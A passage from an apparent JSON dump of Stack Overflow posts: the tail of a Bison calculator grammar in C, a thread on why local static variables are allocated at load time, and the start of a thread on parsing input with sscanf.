\"utils/fileutils.h\"\n#include \"lex.yy.h\"\n#include \"utils/errors.h\"\n#include \"utils/stringutils.h\"\n#include \"table.h\"\n\n\nvoid setStandardInput();\nvoid setFileInput(char * filePath);\n\n\n/* External functions and variables from flex */\n\nextern size_t yyleng;\nextern FILE * yyin;\nextern int parsing_line;\nextern char * yytext;\n//extern int yyerror(char *s);\nextern int yyparse();\nextern int yylex();\nint yyerror(char * s);\n\n%}\n\n\n\n\n\n/***** TOKEN DEFINITION *****/\n\n%union{\n    char * text;\n    double value;\n}\n\n%type &lt;value&gt; exp asig\n\n\n\n%token LS\n%token EVAL\n%token &lt;text&gt; ID\n%token &lt;text&gt; VAR\n%token &lt;value&gt; FUNCTION\n%token &lt;value&gt; LEXEME\n%token &lt;value&gt; RESERVED_WORD\n%token &lt;value&gt; NUMBER\n%token &lt;value&gt; INTEGER\n%token &lt;value&gt; FLOAT\n%token &lt;value&gt; BINARY\n%token &lt;value&gt; SCIENTIFIC_NOTATION\n%token &lt;text&gt; CLOSED_STRING\n%token DOCUMENTATION\n%token COMMENT\n%token POW\n%token UNRECOGNIZED_CHAR \n%token MALFORMED_STRING_ERROR \n%token STRING_NOT_CLOSED_ERROR\n%token COMMENT_ERROR \n%token DOCUMENTATION_ERROR\n%token END\n%right '='\n%left '+' '-'\n%left '/' '*'\n%left NEG_MINUS\n%right '^'\n%right '('\n%%\n\n\n\n\ninput:      /* empty_expression */      |   \n            input line\n;\n\nline:       '\\n'                        \n\n        |   asig    '\\n'                {   printf(\"\\t%f\\n\", $1);                                   }   \n        |   asig    END                 {   printf(\"\\t%f\\n\", $1);                                   }       \n        |   LS                          {   print_table();                                          }\n        |   EVAL CLOSED_STRING  '\\n'    {   \n                                            // Getting the file path\n                                            char * filePath = deleteStringSorroundingQuotes($2);\n                                            setFileInput(filePath);\n\n        | END                           { closeFile(yyin);  setStandardInput();}\n\n;\n\nexp:        NUMBER                      {   $$ = $1;                                                }\n        |   VAR                         {   \n                                            lex * result = table_search($1, LEXEME);\n                                            if(result != NULL) $$ = result-&gt;value;\n                                        }\n        |   VAR '(' exp ')'             {   \n\n                                            lex * result = table_search($1, FUNCTION);\n\n                                            // If the result is a function, then invokes it\n                                            if(result != NULL)  $$ = (*(result-&gt;function))($3);\n                                            else yyerror(\"That identifier is not a function.\");\n\n\n                                        }\n        |   exp '+' exp                 {   $$ = $1 + $3;                                           }\n        |   exp '-' exp                 {   $$ = $1 - $3;                                           }\n        |   exp '*' exp                 {   $$ = $1 * $3;                                           }\n        |   exp '/' exp                 {   \n                                            if($3 != 0){ $$ = $1 / $3;};    \n                                            yyerror(\"You can't divide a number by zero\");   \n                                        }\n        |   '-' exp %prec NEG_MINUS     {   $$ = -$2;                                               }\n        |   exp '^' exp                 {   $$ = pow($1, $3);                                       }\n        |   '(' exp ')'                 {   $$ = $2;                                                }\n        |   '(' error ')'               {   \n                                            yyerror(\"An error has ocurred between the parenthesis.\");   yyerrok; yyclearin;     \n\n                                        }\n\n;\n\n\nasig:       exp                         { $$ = $1;                                                  }   \n        |   VAR '=' asig                {   \n                                            int type = insertLexeme($1, $3);\n\n                                            if(type == RESERVED_WORD){ \n                                                yyerror(\"You tried to assign a value to a reserved word.\");\n                                                YYERROR;\n\n                                            }else if(type == FUNCTION){\n                                                yyerror(\"You tried to assign a value to a function.\");\n                                                YYERROR;\n\n                                            }\n                                            $$ = $3;\n\n                                        }\n;\n\n%%\n\n\nvoid setStandardInput(){\n\n    printf(\"Starting standard input:\\n\");\n    yyin = NULL;\n\n    yyin = stdin;\n    yyparse();\n\n}\n\nvoid setFileInput(char * filePath){\n    FILE * inputFile = openFile(filePath);\n\n    if(inputFile == NULL){\n        printf(\"The file couldn't be loaded. Redirecting to standard input: \\n\");\n        setStandardInput();\n    }else{\n        yyin = inputFile;\n    }\n}\n\n\n\nint main(int argc, char ** argv) {\n\n\n    create_table();         // Table instantiation and initzialization\n\n    initTable();            // Symbol table initzialization\n\n    setStandardInput();     // yyin = stdin\n\n    while(yyparse()!=1);\n\n    print_table();\n\n\n    // Table memory liberation\n    destroyTable();\n\n\n    return 0;\n}\n\n\nint yyerror(char * s){\n    printf(\"---------- Error in line %d --&gt; %s ----------------\\n\", parsing_line, s);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2100815"}, "edited": false, "score": 3, "creation_date": 1497986247, "post_id": 44661285, "comment_id": 76308102, "body": "&quot;with this drawback&quot; - what drawback? If the compiler had to do as you suggest, it would have to allocate the variables dynamically, which would mean they would need to be implemented as pointers."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1497986372, "post_id": 44661285, "comment_id": 76308180, "body": "In C++, local static variables aren&#39;t initialized until the declaration is executed. You can only tell the difference for objects with constructors that have side effects."}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497986378, "post_id": 44661285, "comment_id": 76308182, "body": "@NeilButterworth , for static variables in functions which are not invoked, the memory getting allocated when programs loads"}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1497986602, "post_id": 44661285, "comment_id": 76308313, "body": "@Barmar, I think what you said may not be completely right. If the value is constant then they are intialized before, but if static variables are initialised with function args or if static variables are class or struct objects, they are initialised when executed. Observed this in MSVC++ 14.0 in x86 build"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1497986767, "post_id": 44661285, "comment_id": 76308403, "body": "Allocating the memory when the function is first called would require a dynamic memory allocation -- as the memory has to persist after the function exits, allocating on the stack is not possible. A dynamic memory allocation is a very costly procedure..."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 5, "creation_date": 1497986869, "post_id": 44661285, "comment_id": 76308463, "body": "Try compiling with optimizations and you may find that those allocations never happen."}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1497987273, "post_id": 44661285, "comment_id": 76308701, "body": "@Fran&#231;oisAndrieux , yeah an optimised code will be different. But allocating memory for static variables will be done by every compiler irrespective of optimization. What advantage it adds to do it at compile time?"}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1497987417, "post_id": 44661285, "comment_id": 76308794, "body": "<code>static</code> variables are <b>always</b> initialized. If you don&#39;t tell the compiler to do otherwise, to 0"}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497987467, "post_id": 44661285, "comment_id": 76308826, "body": "May I know the reason for downvote? I know the way it behaves, I asked why it has to be done and what advantage it adds. I couldn&#39;t find it anywhere else, so had to raise a question."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1497987472, "post_id": 44661285, "comment_id": 76308831, "body": "@infiniteloop Perhaps there is some miscommunication happening. What do you mean exactly by &quot;allocating memory at compile time&quot;? Second, what does it matter if the compiler decides that it will need memory for a static variable if, by the time the final binary is linked, that memory requirement is dropped?"}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1497987788, "post_id": 44661285, "comment_id": 76309003, "body": "@Fran&#231;oisAndrieux , in the case/script I mentioned, even though I haven&#39;t invoked functions memory for static variables inside them is actually allocated when program loads. Isn&#39;t that a waste of memory. *I&#39;m not optimising the code"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 3, "creation_date": 1497988199, "post_id": 44661285, "comment_id": 76309242, "body": "<i>&quot;I&#39;m not optimising the code&quot;</i> - well then of course it is going to be wasteful. That&#39;s the entire point of turning on compiler optimization, to make it get rid of as much waste (in both memory and operations) as posssible"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 3, "creation_date": 1497988298, "post_id": 44661285, "comment_id": 76309302, "body": "<code>c</code> or <code>c++</code>?  Choose one."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 1, "creation_date": 1497988386, "post_id": 44661285, "comment_id": 76309349, "body": "@infiniteloop When people talk about optimized builds, they refer to building for Release (Visual Studio&#39;s term for it) rather than Debug. They generally do not mean to tell you to manually tune your code."}, {"owner": {"reputation": 1, "user_id": 5910058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/87e1ce21ce04eb150f59eaec245d4ff8?s=128&d=identicon&r=PG&f=1", "display_name": "Jesper Juhl", "link": "https://stackoverflow.com/users/5910058/jesper-juhl"}, "edited": false, "score": 0, "creation_date": 1497989602, "post_id": 44661285, "comment_id": 76310007, "body": "Variables being initilized to zero at compile time cost you nothing. Those variables are just being put into the bss segment and if you don&#39;t use them they cost you nothing. If you use them they&#39;ll be zero filled."}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1497992872, "post_id": 44661285, "comment_id": 76311722, "body": "@infiniteloop If you have functions that you are not calling, that&#39;s wasteful,that code also takes up space. If those functions also contains local static variables, that&#39;s even more space taken up that&#39;s of no use. So sure, you might call that wasteful - but it&#39;s unlikely to matter one iota unless you work in a constrained environment. The compiler will optimize speed for the case when the functions are called, it&#39;s not going to try to save space for a silly case of adding functions to a program that are not called."}], "answers": [{"comments": [{"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497986744, "post_id": 44661444, "comment_id": 76308389, "body": "That is what even I read, but if the functions are not even invoked what advantage it brings in allocating memory to variables that are not even used"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2100815"}, "edited": false, "score": 1, "creation_date": 1497986756, "post_id": 44661444, "comment_id": 76308396, "body": "The compiler runtime <i>does</i> need to keep track of whether a local static variable has been initialised or not, so that it performs initialisation once only. In C++, it must also arrange to lock the variable against initialisation via multiple threads."}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497986792, "post_id": 44661444, "comment_id": 76308415, "body": "What if the static local variables are arrays which take a lot of memory that is unused"}, {"owner": {"reputation": 38726, "user_id": 301883, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/937b36681a56def2b41c438a00e12b46?s=128&d=identicon&r=PG", "display_name": "Edward Strange", "link": "https://stackoverflow.com/users/301883/edward-strange"}, "reply_to_user": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497986885, "post_id": 44661444, "comment_id": 76308472, "body": "@infiniteloop - apparently they&#39;re using a compiler that doesn&#39;t remove code that isn&#39;t used, or they&#39;re using flags that turn that stuff off...or...  That is an optimization that compilers are free to use or not.  If it can&#39;t tell for whatever reason, or it was told not to, you&#39;re going to see all the code for those functions regardless."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497986890, "post_id": 44661444, "comment_id": 76308474, "body": "@infiniteloop Don&#39;t do that. Use <code>malloc()</code> along with a static pointer that you initialize the first time."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 38726, "user_id": 301883, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/937b36681a56def2b41c438a00e12b46?s=128&d=identicon&r=PG", "display_name": "Edward Strange", "link": "https://stackoverflow.com/users/301883/edward-strange"}, "edited": false, "score": 0, "creation_date": 1497986977, "post_id": 44661444, "comment_id": 76308526, "body": "@CrazyEddie The compiler can&#39;t tell that the function is not going to be called, so it has to generate the code in case it is."}, {"owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "edited": false, "score": 0, "creation_date": 1497987142, "post_id": 44661444, "comment_id": 76308626, "body": "@Barmar , yeah I&#39;ll not do that, but if the code is not optimised and if such a case (array) is there, isn&#39;t it a waste of unused memory allocation. My query is if allocates it in the beginning, what advantage it gets. If nothing, then allocating when line of code gets executed is equally good and better?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1497987203, "post_id": 44661444, "comment_id": 76308653, "body": "Like I wrote, it&#39;s a tradeoff. The compiler assumes that most functions will be called, so it generates code that&#39;s better for that."}, {"owner": {"reputation": 305833, "user_id": 68587, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/7d9fd158e03cbde94f7e0b33b78222af?s=128&d=identicon&r=PG", "display_name": "John Kugelman", "link": "https://stackoverflow.com/users/68587/john-kugelman"}, "edited": false, "score": 1, "creation_date": 1497987255, "post_id": 44661444, "comment_id": 76308690, "body": "Please stop repeating your question. We understand your question. Read the answers and comments you&#39;ve been given. There&#39;s a tradeoff, which has been explained."}, {"owner": {"reputation": 38726, "user_id": 301883, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/937b36681a56def2b41c438a00e12b46?s=128&d=identicon&r=PG", "display_name": "Edward Strange", "link": "https://stackoverflow.com/users/301883/edward-strange"}, "edited": false, "score": 0, "creation_date": 1497987265, "post_id": 44661444, "comment_id": 76308695, "body": "@Barmar - actually it can if the code is in one complete translation unit or the linker can when you turn on whole program op.  I can&#39;t think of a compiler <i>suite</i> that doesn&#39;t do it."}, {"owner": {"reputation": 38726, "user_id": 301883, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/937b36681a56def2b41c438a00e12b46?s=128&d=identicon&r=PG", "display_name": "Edward Strange", "link": "https://stackoverflow.com/users/301883/edward-strange"}, "edited": false, "score": 0, "creation_date": 1497987345, "post_id": 44661444, "comment_id": 76308743, "body": "@Barmar - in fact one of my hardest questions was created by this fact.  My compiler optimized whole translation units away, which it&#39;s free to do so when linking if you never use anything in it, and so the side effects of a global init did not happen."}, {"owner": {"reputation": 38726, "user_id": 301883, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/937b36681a56def2b41c438a00e12b46?s=128&d=identicon&r=PG", "display_name": "Edward Strange", "link": "https://stackoverflow.com/users/301883/edward-strange"}, "edited": false, "score": 0, "creation_date": 1497987520, "post_id": 44661444, "comment_id": 76308861, "body": "@tofro Here guys...thinking that static variables are <b>always</b> initialized can really cause you a lot of pain: <a href=\"https://stackoverflow.com/questions/4383602/how-to-force-inclusion-of-unused-object-definitions-in-a-library\" title=\"how to force inclusion of unused object definitions in a library\">stackoverflow.com/questions/4383602/&hellip;</a>"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 1, "creation_date": 1497988016, "post_id": 44661444, "comment_id": 76309120, "body": "@Fran&#231;oisAndrieux In C++ I&#39;d probably use a class, since the constructor shouldn&#39;t be called until the first time the code is executed -- essentially what the OP wants."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1497988117, "post_id": 44661444, "comment_id": 76309183, "body": "@Barmar Errata : I did not notice the C tag on this question before posting my last comment. Since the <code>malloc</code> is fixed, I&#39;ll delete the comment."}, {"owner": {"reputation": 1, "user_id": 5910058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/87e1ce21ce04eb150f59eaec245d4ff8?s=128&d=identicon&r=PG&f=1", "display_name": "Jesper Juhl", "link": "https://stackoverflow.com/users/5910058/jesper-juhl"}, "edited": false, "score": 0, "creation_date": 1497989972, "post_id": 44661444, "comment_id": 76310189, "body": "Don&#39;t use <code>malloc</code> in C++, use <code>new</code>."}, {"owner": {"reputation": 1, "user_id": 5910058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/87e1ce21ce04eb150f59eaec245d4ff8?s=128&d=identicon&r=PG&f=1", "display_name": "Jesper Juhl", "link": "https://stackoverflow.com/users/5910058/jesper-juhl"}, "edited": false, "score": 0, "creation_date": 1497992470, "post_id": 44661444, "comment_id": 76311512, "body": "@Barmar then why is it tagged &quot;C++&quot;?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1497992568, "post_id": 44661444, "comment_id": 76311565, "body": "It&#39;s tagged both C and C++. I posted C code and an explanation that I would use a <code>std::array</code> in C++."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 6, "last_activity_date": 1497992146, "last_edit_date": 1497992146, "creation_date": 1497986652, "answer_id": 44661444, "question_id": 44661285, "link": "https://stackoverflow.com/questions/44661285/what-is-the-need-local-static-variables-are-allocated-memory-during-compile-tim/44661444#44661444", "title": "What is the need, local static variables are allocated memory during compile time?", "body": "<p>Allocating and initializing the memory at compile time means the program doesn't have to keep track of whether the function has already been entered and the variable has been initialized. Local static variables with constant initial values are treated essentially the same as global variables, except that the name is only in the scope of that function.</p>\n\n<p>It's a time-space tradeoff -- initializing it during the first call would require code that has to be executed every time the function is called. Initializing it when the program is loaded means that its initialization is done as part of the block copy from the executable's text segment to the data segment of memory, along with global statics.</p>\n\n<p>See <a href=\"https://stackoverflow.com/questions/246564/what-is-the-lifetime-of-a-static-variable-in-a-c-function\">What is the lifetime of a static variable in a C++ function?</a> for the more complicated case of C++ local static variables. In C++ I would probably use a static <code>std::array</code>, which I don't think would be initialized until the function is entered.</p>\n\n<p>If you have a large array in a function that's rarely called, and you don't want to waste memory for it, use a static pointer instead of a static array, and initialize it yourself.</p>\n\n<pre><code>void func1() {\n    static int *data;\n\n    if (!data) { // Need to protect this with a mutex if multi-threading\n        data = malloc(N * sizeof(int));\n        for (int i = 0; i &lt; N; i++) {\n            data[i] = i;\n        }\n    }\n    ...\n}\n</code></pre>\n\n<p>This is the code the compiler would have to generate to do first-time initialization of the array.</p>\n"}], "owner": {"reputation": 1253, "user_id": 5558647, "user_type": "registered", "accept_rate": 46, "profile_image": "https://i.stack.imgur.com/qzqCQ.gif?s=128&g=1", "display_name": "infinite loop", "link": "https://stackoverflow.com/users/5558647/infinite-loop"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 439, "favorite_count": 0, "accepted_answer_id": 44661444, "answer_count": 1, "score": 0, "last_activity_date": 1498227312, "creation_date": 1497986061, "last_edit_date": 1497986861, "question_id": 44661285, "link": "https://stackoverflow.com/questions/44661285/what-is-the-need-local-static-variables-are-allocated-memory-during-compile-tim", "title": "What is the need, local static variables are allocated memory during compile time?", "body": "<p>I'm learning about <code>static</code> variables in C and got to know that memory for <code>static</code> variables is allocated at compile time (how much memory has to be allocated and its virtual address is calculated during compile time and actual memory is allocated when program loads) in either data segment/.bss depending whether initialized or not</p>\n\n<p>I have seen in some web site posts that since the size the object/variable will take is predefined based on the variable type, the memory is allocated at compile time. But I didn't understand the need of this in case of local <code>static</code> variables that are defined in a function and whose scope is only within the function.</p>\n\n<p>Consider the following code snippet:</p>\n\n<pre><code>void func()\n{\n    static int i;\n    /*some logic*/\n} \n\nvoid func1()\n{\n    static int data[10] = {1,2,3,4,5,6,7,8,9,10};\n    /*some logic*/\n}\n\nint main()\n{\n    /*logic not involving func() and func1()*/\n}\n</code></pre>\n\n<p>In this case, the functions <code>func</code> and <code>func1</code> are not at all invoked in the program, yet the memory for <code>static</code> variables in those functions are allocated as soon as the program loads (<strong>from what I learnt</strong>) which is actually not used. So, with this drawback what's the use of allocating memory for local <code>static</code> variables. Why can't the compiler allocate memory for them in the data segment when it goes through the function.</p>\n\n<p><strong><em>I have gone through stack overflow questions regarding this and couldn't get an exact answer</em></strong>\nPlease help!!!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "edited": false, "score": 0, "creation_date": 1497984387, "post_id": 44660782, "comment_id": 76307043, "body": "The enter key (newline, <code>\\n</code>) is actually <code>10, 13</code> (on Windows. on Mac it&#39;s just <code>10</code> and on Unix it&#39;s just <code>13</code>). C strings have to be null-terminated. So your actual string will end when you either read a 100 random bytes off the stack, or sooner if you encounter a zero."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1497984580, "post_id": 44660782, "comment_id": 76307168, "body": "<code>sscanf(user_data,&quot;%u&quot;,&amp;numbers[i]);</code> that only scans the first integer of your <code>user_data</code> string."}, {"owner": {"reputation": 5, "user_id": 6495409, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2dafe0f07d425dd5b2d1948e5b08333?s=128&d=identicon&r=PG&f=1", "display_name": "Muneeb", "link": "https://stackoverflow.com/users/6495409/muneeb"}, "reply_to_user": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "edited": false, "score": 2, "creation_date": 1497984602, "post_id": 44660782, "comment_id": 76307183, "body": "@Shark I didn&#39;t catch that"}, {"owner": {"reputation": 5, "user_id": 6495409, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2dafe0f07d425dd5b2d1948e5b08333?s=128&d=identicon&r=PG&f=1", "display_name": "Muneeb", "link": "https://stackoverflow.com/users/6495409/muneeb"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1497984650, "post_id": 44660782, "comment_id": 76307218, "body": "@Jean-FrancoisFabre Yes, I tried using user_data[i] but it gave me a runtime error. Any solution?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1497984740, "post_id": 44660782, "comment_id": 76307264, "body": "I would do a <code>strtok</code> on the input to separate the tokens and scan them."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "edited": false, "score": 0, "creation_date": 1497985082, "post_id": 44660782, "comment_id": 76307463, "body": "@Shark: That#s not correct. It is newline (<code>10</code>) on Linux/Unix as well! How do 